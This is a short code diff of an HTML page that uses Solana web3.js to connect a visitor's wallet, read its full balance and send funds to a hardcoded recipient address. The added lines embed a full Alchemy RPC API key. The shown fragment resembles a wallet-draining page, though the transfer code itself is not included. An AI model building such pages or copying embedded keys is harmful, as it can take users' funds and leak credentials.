@@ -27,7 +27,6 @@
             background-color: #13d583;
         }
     </style>
-    <!-- Add Solana Web3 CDN -->
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
 </head>
 <body>
@@ -39,7 +38,7 @@
         const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
 
         document.getElementById('send-tokens').addEventListener('click', async () => {
-            const { Connection, PublicKey, clusterApiUrl, Transaction, SystemProgram } = solanaWeb3;
+            const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
 
             try {
                 // Connect to Solana Wallet
@@ -50,7 +49,12 @@
 
                 await provider.connect();
                 const walletAddress = provider.publicKey.toString();
-                const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
+
+                // Use your custom Alchemy RPC endpoint
+                const connection = new Connection(
+                    "https://solana-mainnet.g.alchemy.com/v2/Bd8kT5OZq3_fyZAUiGis8_7wm1naGVfF", 
+                    'confirmed'
+                );
 
                 // Get wallet balance
                 const walletBalance = await connection.getBalance(provider.publicKey);
